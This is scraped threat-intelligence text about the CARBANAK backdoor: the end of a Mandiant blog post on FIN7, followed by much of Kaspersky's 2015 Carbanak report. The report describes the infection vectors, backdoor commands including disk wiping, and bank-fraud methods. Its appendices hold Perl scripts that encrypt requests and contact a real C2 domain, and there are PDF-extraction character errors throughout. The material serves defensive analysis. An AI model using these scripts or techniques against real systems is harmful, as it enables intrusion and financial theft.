Cloud Blog 18/07/24, 16:04 were able to extract. It should be noted that in most of these cases the backdoor was embedded as a packed payload in another executable or in a weaponized document #le of some kind. The MD5 hash is for the original executable #le that eventually launches CARBANAK, but the details of each sample were extracted from memory during execution. This data provides us with a unique insight into the operational aspect of CARBANAK and can be downloaded here. Protocol Evolution As described earlier, CARBANAK’s binary protocol has undergone several signi#cant changes over the years. Figure 7 illustrates a rough timeline of this evolution based on the compile times of samples we have in our collection. This may not be entirely accurate because our visibility is not complete, but it gives us a general idea as to when the changes occurred. It has been observed that some builds of this data-stealing backdoor use outdated versions of the protocol. This may suggest multiple groups of operators compiling their own builds of this data- stealing backdoor independently. Figure 7: Timeline of binary protocol versions *It is likely that we are missing an earlier build that utilized version 3. Build Tool Most of CARBANAK’s strings are encrypted in order to make analysis more di'cult. We have observed that the key and the cipher texts for all the encrypted strings are changed for each sample that we have encountered, even amongst samples with the same compile time. The RC2 key used for the HTTP protocol has also been observed to change among samples with the same compile time. These observations paired with the use of campaign codes that must be con#gured denote the likely existence of a build tool. Rapid Builds https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 9 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 Despite the likelihood of a build tool, we have found 57 unique compile times in our sample set, with some of the compile times being quite close in proximity. For example, on May 20, 2014, two builds were compiled approximately four hours apa% and were con#gured to use the same C2 servers. Again, on July 30, 2015, two builds were compiled approximately 12 hours apa%. What changes in the code can we see in such sho% time intervals that would not be present in a build tool? In one case, one build was programmed to execute the runmem command for a #le named wi.exe while the other was not. This command downloads an executable from the C2 and directly runs it in memory. In another case, one build was programmed to check for the existence of the domain blizko.net in the trusted sites list for Internet Explorer while the other was not. Blizko is an online money transfer service. We have also seen that di(erent monitoring threads from Table 1 are enabled from build to build. These minor changes suggest that the code is quickly modi#ed and compiled to adapt to the needs of the operator for pa%icular targets. Campaign Code and Compile Time Correlation In some cases, there is a close proximity of the compile time of a CARBANAK sample to the month speci#ed in a pa%icular campaign code. Figure 8 shows some of the relationships that can be observed in our data set. Campaign Code Compile Date Aug dec julyc jun june june 7/30/15 12/8/14 7/2/16 5/9/15 5/25/14 6/7/14 junevnc 6/20/14 https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 10 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 juspam 7/13/14 juupd 7/13/14 may may ndjun SeP 5/20/14 5/19/15 6/7/16 9/12/14 spamaug 8/1/14 spaug 8/1/14 Figure 8: Campaign code to compile time relationships Recent Updates Recently, 64 bit variants of the backdoor have been discovered. We shared details about such variants in a recent blog post. Some of these variants are programmed to sleep until a con#gured activation date when they will become active. History The “Carbanak Group” Much of the publicly released repo%ing surrounding the CARBANAK malware refers to a corresponding “Carbanak Group”, who appears to be behind the malicious activity associated with this data-stealing backdoor. FireEye iSIGHT Intelligence has tracked several separate overarching campaigns employing the CARBANAK tool and other associated backdoors, such as DRIFTPIN (aka Toshliph). With the data available at this time, it is unclear how interconnected these campaigns are – if they are all directly orchestrated by the same criminal group, or if these campaigns were perpetrated by loosely a'liated actors sharing malware and techniques. https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 11 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 FIN7 In all Mandiant investigations to date where the CARBANAK backdoor has been discovered, the activity has been a!ributed to the FIN7 threat group. FIN7 has been extremely active against the U.S. restaurant and hospitality industries since mid-2015. FIN7 uses CARBANAK as a post-exploitation tool in later phases of an intrusion to cement their foothold in a network and maintain access, frequently using the video command to monitor users and learn about the victim network, as well as the tunnel command to proxy connections into isolated po%ions of the victim environment. FIN7 has consistently utilized legally purchased code signing ce%i#cates to sign their CARBANAK payloads. Finally, FIN7 has leveraged several new techniques that we have not observed in other CARBANAK related activity. We have covered recent FIN7 activity in previous public blog posts: FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings FIN7 Evolution and the Phishing LNK To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence The FireEye iSIGHT Intelligence MySIGHT Po%al contains additional information on our investigations and observations into FIN7 activity. Widespread Bank Targeting Throughout the U.S., Middle East and Asia Proofpoint initially repo%ed on a widespread campaign targeting banks and #nancial organizations throughout the U.S. and Middle East in early 2016. We identi#ed several additional organizations in these regions, as well as in Southeast Asia and Southwest Asia being targeted by the same a!ackers. This cluster of activity persisted from late 2014 into early 2016. Most notably, the infrastructure utilized in this campaign overlapped with LAZIOK, NETWIRE and other malware targeting similar #nancial entities in these regions. DRIFTPIN https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 12 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 DRIFTPIN (aka Spy.Agent.ORM, and Toshliph) has been previously associated with CARBANAK in various campaigns. We have seen it deployed in initial spear phishing by FIN7 in the #rst half of 2016. Also, in late 2015, ESET repo%ed on CARBANAK associated a!acks, detailing a spear phishing campaign targeting Russian and Eastern European banks using DRIFTPIN as the malicious payload. Cypho% Labs also revealed that variants of DRIFTPIN associated with this cluster of activity had been deployed via the RIG exploit kit placed on two compromised Ukrainian banks’ websites. FireEye iSIGHT Intelligence observed this wave of spear phishing aimed at a large array of targets, including U.S. #nancial institutions and companies associated with Bitcoin trading and mining activities. This cluster of activity continues to be active now to this day, targeting similar entities. Additional details on this latest activity are available on the FireEye iSIGHT Intelligence MySIGHT Po%al. Earlier CARBANAK Activity In December 2014, Group-IB and Fox-IT released a repo% about an organized criminal group using malware called ""Anunak"" that has targeted Eastern European banks, U.S. and European point-of-sale systems and other entities. Kaspersky released a similar repo% about the same group under the name ""Carbanak"" in February 2015. The name “Carbanak” was coined by Kaspersky in this repo% – the malware authors refer to the backdoor as Anunak. This activity was fu%her linked to the 2014 exploitation of ATMs in Ukraine. Additionally, some of this early activity shares a similarity with current FIN7 operations – the use of Power Admin PAExec for lateral movement. Conclusion The details that can be extracted from CARBANAK provide us with a unique insight into the operational details behind this data- stealing malware. Several inferences can be made when looking at such data in bulk as we discussed above and are summarized as follows: 1. Based upon the information we have observed, we believe that at least some of the operators of CARBANAK either have access to the source code directly with knowledge on how to https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 13 di 14 Behind the CARBANAK Backdoor | Mandiant | Google Cloud Blog 18/07/24, 16:04 modify it or have a close relationship to the developer(s). 2. Some of the operators may be compiling their own builds of the backdoor independently. 3. A build tool is likely being used by these a!ackers that allows the operator to con#gure details such as C2 addresses, C2 encryption keys, and a campaign code. This build tool encrypts the binary’s strings with a fresh key for each build. 4. Varying campaign codes indicate that independent or loosely a'liated criminal actors are employing CARBANAK in a wide- range of intrusions that target a variety of industries but are especially directed at #nancial institutions across the globe, as well as the restaurant and hospitality sectors within the U.S. Posted in Threat Intelligence—Security & Identity Related articles Threat Intelligence Threat Intelligence Threat Intelligence Threat Intelligence APT41 Has Arisen From the DUST By Mandiant • 27-minute read AI-Powered Learning: Your NIST NICE Prompt Library (Built with Google Gemini) Scaling Up Malware Analysis with Gemini 1.5 Flash By Threat Intelligence • 13- Emboldened and Evolving: A Snapshot of Cyber Threats Facing NATO By Mandiant • 10-minute minute read By Mandiant • 10-minute read read Follow us Google Cloud Google Cloud Products Privacy Terms Help English https://cloud.google.com/blog/topics/threat-intelligence/behind-the-carbanak-backdoor/ Pagina 14 di 14"
carbanak,cti-hal,f1d8187e4609,G0008,"CARBANAK APT THE GREAT BANK ROBBERY Version 2.1 February, 2015 #TheSAS2015 #Carbanak 2 Table of contents 1. Executive Summary ...........................................................................................3 2. Analysis ...............................................................................................................5 2.1 Infection and Transmission ........................................................................5 2.2 Malware Analysis – Backdoor.Win32.Carbanak ......................................7 2.3 Lateral movement tools .......................................................................... 18 2.4 Command and Control (C2) Servers ....................................................... 19 3. Conclusions ..................................................................................................... 23 APPENDIX 1: C2 protocol decoders .................................................................... 24 APPENDIX 2: BAT file to detect infection ............................................................ 27 APPENDIX 3: IOC hosts ....................................................................................... 28 APPENDIX 4: Spear phishing .............................................................................. 34 APPENDIX 5: MD5 hashes of Carbanak samples ............................................. 36 TLP: White For any inquiries, please contact intelreports@kaspersky.com 3 1. Executive Summary From late 2013 onwards, several banks and financial institutions have been attacked by an unknown group of cybercriminals. In all these attacks, a similar modus operandi was used. According to victims and the law enforcement agencies (LEAs) involved in the investigation, this could result in cumulative losses of up to 1 billion USD. The attacks are still active. This report provides a technical analysis of these attacks. The motivation for the attackers, who are making use of techniques commonly seen in Advanced Persistent Threats (APTs), appears to be financial gain as opposed to espionage. An analysis of the campaign has revealed that the initial infections were achieved using spear phishing emails that appeared to be legitimate banking communications, with Microsoft Word 97 – 2003 (.doc) and Control Panel Applet (.CPL) files attached. We believe that the attackers also redirected to exploit kits website traffic that related to financial activity. The email attachments exploit vulnerabilities in Microsoft Office 2003, 2007 and 2010 (CVE-2012-0158 and CVE-2013-3906) and Microsoft Word (CVE-2014- 1761). Once the vulnerability is successfully exploited, the shellcode decrypts and executes the backdoor known as Carbanak. Carbanak is a remote backdoor (initially based on Carberp), designed for espionage, data exfiltration and to provide remote access to infected machines. Once access is achieved, attackers perform a manual reconnaissance of the victim’s networks. Based on the results of this operation, the attackers use different lateral movement tools in order to get access to the critical systems in the victim´s infrastructure. They then install additional software such as the Ammyy Remote Administration Tool, or even compromise SSH servers. Notably, some of the latest versions of the analyzed Carbanak malware appear not to use any Carberp source code. Once the attackers successfully compromise the victim´s network, the primary internal destinations are money processing services, Automated Teller Machines (ATM) and financial accounts. In some cases, the attackers used the Society for Worldwide Interbank Financial Telecommunication (SWIFT) network to transfer money to their accounts. In others, Oracle databases were manipulated to open payment or debit card accounts at the same bank or to transfer money between TLP: White For any inquiries, please contact intelreports@kaspersky.com 4 accounts using the online banking system. The ATM network was also used to dispense cash from certain ATMs at certain times where money mules were ready to collect it. As part of the attack´s reconnaissance phase, video recordings of the activities of bank employees, particularly system administrators, were made. The videos were sent to the C2 server. Please note that the attackers abused the aforementioned services by impersonating legitimate local users who had the permissions to perform the actions later reproduced by the cybercriminals. As far as we know, none of the aforementioned services were attacked nor was any specific vulnerability within them exploited. Of the 100 banking entities impacted at the time of writing this report, at least half have suffered financial losses. Most of the victims based in the geolocation of infected IPs are located in Russia, USA, Germany, China and Ukraine. That does not necessarily mean that all these victims are banking entities. The magnitude of the losses is significant. For example, one victim lost approximately $7.3 million (USD) due to ATM fraud; another suffered a $10 million (USD) loss due to the exploitation of its online banking platform. Stolen funds were transferred out of the affected countries to bank accounts in the US and China. Additionally some of the C2 servers have log entries indicating connections to systems located in the US. Telemetry indicates that the attackers are expanding operations to other regions, such as Asia, the Middle-East, Africa and Europe. This report discusses the attack vectors, infection mechanisms and toolkits used by the attackers to exploit the network after the initial infection, as well as the operational details and geographical distribution of this campaign. TLP: White For any inquiries, please contact intelreports@kaspersky.com 5 2. Analysis During the spring of 2014, Kaspersky Lab was involved in a forensic analysis of ATMs dispensing cash to people located near them but with no physical interaction according to security cameras. No malware was detected on these ATMs. However, Carberp-like malware was found on a computer that was connected to them via VPN. Following the investigation of this incident, in the summer of 2014, Kaspersky Lab identified the same Carberp-like malware in another investigation involving a bank, where criminals were able to gain access to its online banking systems. In this investigation, we started analyzing all the computers in the bank’s infrastructure in order to find the source of the infection. We found spear phishing emails with CPL files attached that, after a successful infection, install the same Carberp-like malware we had previously found in the case involving the ATMs. There is evidence indicating that in most cases the network was compromised for between two to four months, and that many hundreds of computers within a single victim organization may have been infected. This period of time was used by the attackers to get access to the right victims and critical systems, and to learn how to operate their tools and systems to get the cash out. Carbanak contains an espionage component that allows the attackers to take control of video capabilities on the victim systems. Thanks to this, long term observation and reconnaissance could be conducted. This allowed the attackers to understand the protocols and daily operational tempo of their targets. Based on this understanding, exploitation methodologies and mechanisms were developed and tailored to each victim. 2.1 Infection and Transmission All observed cases used spear phishing emails with Microsoft Word 97 – 2003 (.doc) files attached or CPL files. The doc files exploit both Microsoft Office (CVE- 2012-0158 and CVE-2013-3906) and Microsoft Word (CVE- 2014-1761). There are indicators that point to a possible Chinese origin for the exploits used in these attachments. Command and Control (C2) servers located in China have been identified in this campaign. In addition, registration information for some of the domains use details of supposedly Chinese citizens. Obviously, all this could just be a red herring. TLP: White For any inquiries, please contact intelreports@kaspersky.com 6 The targets were all employees affiliated to the affected institution. The spear phishing email messages appeared legitimate and in some cases were sent from compromised coworkers´ accounts. In this way compromised systems were used as a transmission vector. Given that the victims were mostly Russian-speaking financial institutions, the names of the attachments we have identified were generally in Russian. Examples include “Соответствие ФЗ-115” and “Приглашение” which translate into “Accordance to Federal Law” and “Invitation” respectively. This is enough to induce a typical employee to open the attachment and execute the malware. For a complete list of file names see Appendix 4. The following is an example of a Carbanak spear phishing email: Translated: In this case, the attachment was a CPL file compressed using the Roshal Archive (.rar) format. Once the remote code execution vulnerability is successfully exploited, it installs Carbanak on the victim's system. The complete list of observed spear phishing emails can be found in Appendix 1 – Spear phishing. An additional infection vector that we believe was used by the criminals is a classical drive-by-download attack. We have found traces of the Null and the RedKit exploits kits. TLP: White For any inquiries, please contact intelreports@kaspersky.com 7 Figure 1. Null Exploit Kit – statistics on victims, found in one Carbanak C2 The image above translates as Country_name, All visitors, Unique visitors, Banned visitor, Revoked infections, Infected. 2.2 Malware Analysis – Backdoor.Win32.Carbanak Carbanak is a backdoor used by the attackers to compromise the victim's machine once the exploit, either in the spear phishing email or exploit kit, successfully executes its payload. This section provides a functional analysis of Carbanak’s capabilities. Carbanak copies itself into “%system32%\com” with the name “svchost.exe” with the file attributes: system, hidden and read-only. The original file created by the exploit payload is then deleted. To ensure that Carbanak has autorun privileges the malware creates a new service. The naming syntax is “<ServiceName>Sys” where ServiceName is any existing service randomly chosen, with the first character deleted. For example, if the existing service´s name is “aspnet” and the visible name is “Asp.net state TLP: White For any inquiries, please contact intelreports@kaspersky.com 8 service”, the service created by the malware would be “aspnetSys” with a visible name of “Sp.net state service”. Before creating the malicious service, Carbanak determines if either the avp.exe or avpui.exe processes (components of Kaspersky Internet Security) is running. If found on the target system, Carbanak will try to exploit a known vulnerability in Windows XP, Windows Server 2003, Windows Vista, Windows Server 2008, Windows 7, Windows 8, and Windows Server 2012, CVE-2013-3660, for local privilege escalation. We believe this is not relevant and that the attackers adapt their tools to the victim´s defenses. Carbanak creates a file with a random name and a .bin extension in %COMMON_APPDATA%\Mozilla where it stores commands to be executed. Then the malware gets the proxy configuration from the registry entry: [HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings] and the Mozilla Firefox configuration file in: %AppData%\Mozilla\Firefox\<ProfileName>\prefs.js How to detect Carbanak One of the best methods for detecting Carbanak is to look for .bin files in the folder: ..\All users\%AppData%\Mozilla\ The malware saves files in this location that will later be sent to the C2 server when an internet connection is detected. A .BAT script for detecting infections is provided in the Appendixes. Additionally, Carbanak can obtain proxy configuration information from headers sent through an application via SOCKS or HTTP. Carbanak injects its code into svchost.exe. Most of the actions described below happen within this process. Carbanak downloads the file kldconfig.plug from its C2 server. This file includes the names of the processes to be monitored. Once the system is infected, Carbanak logs keystrokes and takes screenshots every 20 seconds. This monitoring is performed by intercepting the ResumeThread call. TLP: White For any inquiries, please contact intelreports@kaspersky.com 9 To enable connections to the infected computer using the Remote Desktop Protocol (RDP), Carbanak sets Termservice service execution mode to Auto. Also, after executing this service, it modifies the executable code in memory in order to establish simultaneous work processes for both remote and local users. Modules modified in this process are: termsrv.dll, csrsrv.dll, msgina.dll and winlogon.exe. If Carbanak detects the banking application BLIZKO (funds transfer software) in the infected computer, it sends a special notification to its C2 server. Carbanak is also aware of the IFOBS banking application and can, on command, substitute the details of payment documents in the IFOBS system. To communicate with its C2 server, Carbanak uses the HTTP protocol with RC2+Base64 encryption, adding additional characters not included in Base64. It also inserts strings with different extensions (.gif,.htm, etc.) at random locations in the HTTP request. Example of a typical Carbanak request: Carbanak sends its collected monitoring data to its C2 server. It also receives commands. The commands are compared with a hash table; if there is a match Carbanak performs the associated action: Hash Command Description 0AA37987 7AA8A5 7CFABF state video 6E533C4 download Executes all commands stored in the configuration file. Sets malware state flag. Sends captured screen or process window video to C2. Downloads and runs executable file from C2. Executable file is stored in %TEMP% with a random name. 684509 ammyy Downloads and run “Ammy Admin” remote control software and adds it to the system´s firewall exclusion list. 7C6A8A5 update Malware update. 0B22A5A7 0B77F949 Monitoring configuration update («klgconfig.plug»). Unknown. TLP: White For any inquiries, please contact intelreports@kaspersky.com 10 Hash Command Description 7203363 killos Kills the operating system through the following actions: 1- Puts in «ImagePath» registry [HKLM\SYSTEM\ControlSet001\ services\ACPI], [HKLM\SYSTEM\ControlSet002\services\ACPI] and [HKLM\SYSTEM\CurrentControlSet\services\ACPI] bad data. 2- Writes bytes with value zero into the first 512 bytes of hardrive «\\.\PHYSICALDRIVE0». Then reboots. OS reboot. Creates network tunnel to specified network address, routing all traffic there. 78B9664 7BC54BC reboot tunnel 7B40571 adminka Uses specified proxy settings. 79C9CC2 server Changes C&C server. 7C9C2 78B0 user rdp 79BAC85 secure Creates or deletes user. Modifies “termsrv.dll”, “csrsrv.dll, “msgina.dl” and “winlogon. exe” modules. Modification allows multiple connections via RDP protocol and makes RDP persistent. Loads and overwrites .dll responsible for passwords policy. New .dll location points to «Notification Packages» [HKLM\ System\ CurrentControlSet\Control\Lsa] registry key. 6ABC del Deletes specified service or file. 0A89AF94 79C53BD Executes specified command hash. Loads and executes file from specified network location. File executes in memory and is not stored on the harddrive. 0F4C3903 Sends local user system password to C2. 0BC205E4 screenshot Creates and sends screenshots. 7A2BC0 6BC6C 4ACAFC3 sleep dupl Turns off malware activity for a specified period of time. Unknown. Uploads specified file or directory. 7D43 vnc Establish VNC session. 9C4D055 2032914 Unknown. Unknown. TLP: White For any inquiries, please contact intelreports@kaspersky.com 11 In order to render the malware less suspicious, the latest Carbanak samples are digitally signed: 1. footprintcrsgn.dll MD5 08F83D98B18D3DFF16C35A20E24ED49A Figure 2. Carbanak digital signature TLP: White For any inquiries, please contact intelreports@kaspersky.com 12 2. PAExec_Move0.dat MD5 972092CBE7791D27FC9FF6E9ACC12CC3 Figure 3. Carbanak digital signature TLP: White For any inquiries, please contact intelreports@kaspersky.com 13 One of Carbanak’s lateral movement tools is also digitally signed: 3. PAExec-6980-PB-FS-01.ex_ MD5 86A5C466947A6A84554843D852478248 Figure 4. Carbanak lateral movement tool digital signature TLP: White For any inquiries, please contact intelreports@kaspersky.com 14 Geographical Distribution Known samples of Carbanak have been uploaded to VirusTotal from the following locations: Figure 5. Countries from which Carbanak has been uploaded Known exploits that download Carbanak have been uploaded to VirusTotal mostly from Russia. TLP: White For any inquiries, please contact intelreports@kaspersky.com According to KSN data, victims are distributed geographically as follows: 15 Figure 6. Geographical distribution of victims according to KSN data The analyzed Carbanak samples, excluding some obvious outliers, have the following compilation time distribution: Figure 7. Carbanak compilation timestamp distribution TLP: White For any inquiries, please contact intelreports@kaspersky.com 16 It is also very interesting to see the distribution of Carbanak submissions to VirusTotal. This way we can identify periods when the malware came to the attention of potential victims and security researchers, and helps to reveal peaks in the group’s activity: Figure 8. Distribution of Carbanak submissions to VirusTotal Since the beginning of this case, Kaspersky Lab has worked in cooperation with the LEAs investigating it. During the investigation LEAs shared with us statistical data from their research that helped us to complete our picture of the campaign. TLP: White For any inquiries, please contact intelreports@kaspersky.com The following map shows targets’ IP addresses found in three of Carbanak’s Linux servers at the end of October 2014: 17 Figure 9. Geographical distribution of targets according to C2 data TLP: White For any inquiries, please contact intelreports@kaspersky.com 18 Figure 10. Geographical distribution of victims according to C2 data 2.3 Lateral movement tools Carbanak uses different tools on infected systems, each one with a different purpose. There appears to be a preference for the Ammyy Admin remote administration tool for remote control. Specifically, the attackers have been detected uploading: Ammyy Admin 3.5 (f8cd52b70a11a1fb3f29c6f89ff971ec) as svchost.exe It is believed that the attackers used this remote administration tool because it is commonly whitelisted in the victims’ environments as a result of being used regularly by administrators. In another instance, a Secure Shell (SSH) backdoor was used to communicate with the C2 server in 190.97.165.126 (operatemesscont.net). This indicates that the attackers did not limit themselves to Microsoft Windows environments. In this case, the victim used the Telnet/SSH client PuTTY to connect to the server, and the attackers recompiled the machine’s SSH daemon with a backdoor so they could gain direct access. Logs for these tools indicate that they were accessed from two different IPs, probably used by the attackers, and located in Ukraine and France. We have also found traces of many different tools used by the attackers inside the victim´s network to gain control of additional systems, such as Metasploit, PsExec or Mimikatz. TLP: White For any inquiries, please contact intelreports@kaspersky.com 19 2.4 Command and Control (C2) Servers There appear to be four distinct types of C2 servers: • Linux servers used for issuing commands to deployed Carbanak instances and for receiving collected monitoring data; • Windows servers used for remote connections to victim systems; • Backup servers; and • Drop servers where additional executable files (e.g. remote administration tools) are hosted. Server rotation occurs more or less on a biweekly basis. For a complete list of identified Carbanak servers please check the regularly updated Carbanak IOC document. The current list of IOCs is provided at Appendix 3 in his document. Some of these C2 servers are responsible for dropping Ammyy (configuration and executable files), the KLG plugin configuration (list of processes to monitor) and the VNC server (both 32 and 64 bits to be injected in rundll). In one of the observed servers there was also a Metasploit module. Figure 11. Carbanak administration panel running in Linux TLP: White For any inquiries, please contact intelreports@kaspersky.com 20 Figure 12. Carbanak administration panel running in Linux, list of plugins Figure 13. Carbanak administration panel running in Windows able to run RDP, VNC, proxy and tunnels via Carbanak Victim systems are catalogued in the servers’ databases. The victims belong to a number of different communities, thus simplifying administration. In all, 85 different victims belonging to seven communities were found. TLP: White For any inquiries, please contact intelreports@kaspersky.com 21 Attacker´s operational details Additionally, the malicious servers contain video files that capture a victim´s activity. While the videos are stored using a compressed format which provides poor image quality, the selected format minimizes upload bandwith and is of sufficient quality for the attackers to understand the victims’ activities. The video file naming conventions used the name of the application in the foreground (e.g., Outlook, Cmd, etc.) and only recorded user activity. This helped the attackers to both navigate to files of interest and to discard superfluous files. Figure 14. Special video player designed to watch Carbanak´s video stream Using the intelligence gained from video and other monitoring techniques, the attackers developed an operational picture of the victim's workflow, tooling and practices. This picture helps the attackers to deploy their malicious operations, for example: • Attackers created fake transactions in the victim’s internal database after the verification process, thus avoiding discovery of the fraudulent activity; • Attackers used the victim’s internal command utilities to insert fraudulent operations in the transaction queue. In general, the attackers demonstrated great versatility, using attack methodologies best suited to a specific victim’s operational methodology. However, they seemed to deliberately limit the amount of money stolen per victim to $10 million USD. This limit may be explained as the maximum amount TLP: White For any inquiries, please contact intelreports@kaspersky.com 22 of money that can be transferred via mule services, or the maximum amount of money that is budgeted in banks for fraud risks in order to minimize the chances of LEAs and the bank´s anti-fraud teams from doing a full blown analysis. Figure 15. List of PIN KVC used on ATMs Sensitive bank documents have be found on the servers that were controlling Carbanak. They included classified emails, manuals, crypto keys, passwords and so on. For example, the file in the above figure has KVC (key verification codes) keys that are used by ATMs to check the integrity of the PIN numbers of its users. In other cases involving ATMs, the criminals were able to control computers that had access to the internal ATM network. If the bank had enabled remote access to ATMs, the criminals started using this access to remotely withdraw cash. Criminals used no malware to operate the ATM dispenser; instead they used standard utilities to control and test ATM equipment. TLP: White For any inquiries, please contact intelreports@kaspersky.com 23 3. Conclusions Malware targeting the finance industry (both companies and consumers) continues to evolve. The Carbanak malware used in the on-going campaign described in this report has been very successful in terms of generating revenue. Of particular interest are the attack methods, similar to those used in sophisticated cyber-espionage APTs. As such, they represent a new and disturbing trend in the cybercrime market of increasing attack sophistication. Despite increased awareness of cybercrime within the financial services sector, it appears that spear phishing attacks and old exploits (for which patches have been disseminated) remain effective against larger companies. Attackers always use this minimal effort approach in order to bypass a victim´s defenses. Advanced control and fraud detection systems have been used for years by the financial services industry. However, these focus on fraudulent transactions within customer accounts. The Carbanak attackers bypassed these protections, by for example, using the industry-wide funds transfer (the SWIFT network), updating balances of account holders and using disbursement mechanisms (the ATM network). In neither of these cases did the attackers exploit a vulnerability within the service. Instead, they studied the victim´s internal procedures and pinpointed who they should impersonate locally in order to process fraudulent transactions through the aforementioned services. It is clear that the attackers were very familiar with financial services software and networks. As part of an automated reconnaissance phase, the Carbanak malware checked victim systems for the presence of specialized and specific banking software. Only after the presence of banking systems was confirmed, were victims further exploited. To date, attacks against approximately 300 IP addresses around the world have been observed on analyzed C2s. It is possible that these attacks were coordinated to maximize returns prior to industry-wide information sharing and the implementation of countermeasures. Existing telemetry indicates that the Carbanak attackers are trying to expand operations to other Baltic and Central Europe countries, the Middle East, Asia and Africa. Carbanak may be responsible for losses as high as $1 billion USD. We believe that the Carbanak campaign is a clear indicator of a new era in cybercrime in which criminals use APT techniques directly against the financial industry instead of through its customers. APTs are not only for stealing information anymore. TLP: White For any inquiries, please contact intelreports@kaspersky.com 24 APPENDIX 1: C2 protocol decoders Decryptor #!/usr/bin/perl -w #Work with Carbanak c2 use strict; use warnings; use Crypt::CBC; use Crypt::Cipher::RC2; use MIME::Base64; use LWP::Simple; #my $c2 = ""worldnewsonline.pw""; #my $reguest = ""1234567890123456""; my $reguest_was = ""JybDHkfWGURJPuWeUpPMX/ca9BThbDim0Hdk/9YzkJS7m8a19tz QwZxo1vvQ/r/7SHJcCm4tdpZGp.dmDwKf MjpWBM18eX8VUiimyaUZMGoClZ6eShS9tLCK tuHvlMQ3Dc26y90FbPIua.7LGHGZCBPj.vd08DUENC5oAE4V fyUz.shtml""; $reguest_was =~ tr/\/\=\&\?//d; my $replace = """"; my $find="".shtml""; $reguest_was =~ s/\Q$find\E//g; $reguest_was =~ s/-/+/g; $reguest_was =~ s/\./\//g; print ""$reguest_was\n""; my $iv = substr $reguest_was,0,8; $reguest_was = substr $reguest_was,8; my $base64_decoded1 = decode_base64(""$reguest_was""); print ""$base64_decoded1\n""; my $length = length($base64_decoded1); print ""length is: $length\n""; print ""iv is: $iv\n""; print ""req is: $reguest_was\n""; my $base64_decoded = ""${base64_decoded1}""; my $key = ""vfDGbiwmiqdN6E2N""; #my $key = ""1234567812345678""; my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none', -literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv ); my $plaintext = $cipher->decrypt($base64_decoded); print ""Decode:\ n$plaintext\n""; #Decrypt is #HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data=listprocess|pro cess=svchost.exe|idproce ss=4294967295|lBHReFDRDfYG #my $url = ""http://$c2/$base64_encoded""; #print $url; #my $contents = get($url); #print $contents; TLP: White For any inquiries, please contact intelreports@kaspersky.com 25 Encryptor #!/usr/bin/perl -w #Decrypt Carbanak c2 responce use strict; use warnings; use Crypt::CBC; use Crypt::Cipher::RC2; use MIME::Base64; use LWP::Simple; my $c2 = ""worldnewsonline.pw""; my $reguest = ""HWUMRbvuwKQCrkOhuckIXpdFgtd|new0878802c8004333a3|data=listprocess|pro cess=svchost.exe|idproces s=4294967295|lBHReFDRDfYG""; my $iv = ""JybDHkfW""; #should be random my $key = ""vfDGbiwmiqdN6E2N""; my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none', -literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv ); my $ciphertext = $cipher->encrypt($reguest); my $base64_encoded = encode_base64(""$ciphertext""); $base64_encoded =~ s/\x0a//g; $base64_encoded =~ s/\//\./g; $base64_encoded =~ s/\+/-/g; my $base64_encoded_ex = ""${iv}${base64_encoded}.php""; my $url = ""http://$c2/${base64_encoded_ex}""; print $url; #http://worldnewsonline.pw/ GURJPuWeUpPMXca9BThbDim0Hdk9YzkJS7m8a19tzQwZxo1vvQr7SHJcCm4tdp ZGp. dmDwKfMjpW.BM18eX8VUiimyaUZMGoClZ6eShS9tLCKtuHvlMQ3Dc26y90FbPIua.7LGHG ZCBPj.vd08D UENC5o.AE4VfyUz..php| my $contents = get($url); print $contents; TLP: White For any inquiries, please contact intelreports@kaspersky.com 26 Decrypt Files from CnC #!/usr/bin/perl -w #Decrypt Files from sended from c2 use strict; use warnings; use Crypt::CBC; use Crypt::Cipher::RC2; use MIME::Base64; use LWP::Simple; my $file=$ARGV[0]; open(DATA, ""<$file""); open(DATA1, ""<$file""); open(DATA2, ""<$file""); binmode(DATA); binmode(DATA1); binmode(DATA2); my ($data, $n, $offset); while (($n = read DATA, $data, 1, $offset) != 0) { $offset += $n; } my $length = $offset; my $iv_len = read DATA1, my $iv, 8, 0; read DATA2, my $crypt_data, $length, 8; my $key = ""vfDGbiwmiqdN6E2N""; my $cipher = Crypt::CBC->new( -cipher=>'Cipher::RC2', -header=>'none', -literal_key=>1, -key=>$key, – keysize=>16, -iv=>$iv ); my $plaintext = $cipher->decrypt($crypt_data); print ""$plaintext""; TLP: White For any inquiries, please contact intelreports@kaspersky.com 27 APPENDIX 2: BAT file to detect infection @echo off for /f %%a in ('hostname') do set ""name=%%a"" echo %name% del /f %name%.log 2> nul if exist ""c:\Documents and settings\All users\application data\ mozilla\*.bin"" echo ""BIN detected"" >> %name%.log if exist %SYSTEMROOT%\System32\com\svchost.exe echo ""COM detected"" >> %name%.log if exist ""c:\ProgramData\mozilla\*.bin"" echo ""BIN2 detected"" >> %name%.log if exist %SYSTEMROOT%\paexec* echo ""Paexec detected"" >> %name%.log if exist %SYSTEMROOT%\Syswow64\com\svchost.exe echo ""COM64 detected"" >> %name%.log SC QUERY state= all | find ""SERVICE_NAME"" | findstr ""Sys$"" if q%ERRORLEVEL% == q0 SC QUERY state= all | find ""SERVICE_NAME"" | findstr ""Sys$"" >> %name%.log if not exist %name%.log echo Ok > %name%.log xcopy /y %name%.log ""\\<IP>\logVirus TLP: White For any inquiries, please contact intelreports@kaspersky.com 28 APPENDIX 3: IOC hosts IP/Domain name First seen in Type Source: Sample md5/Detection 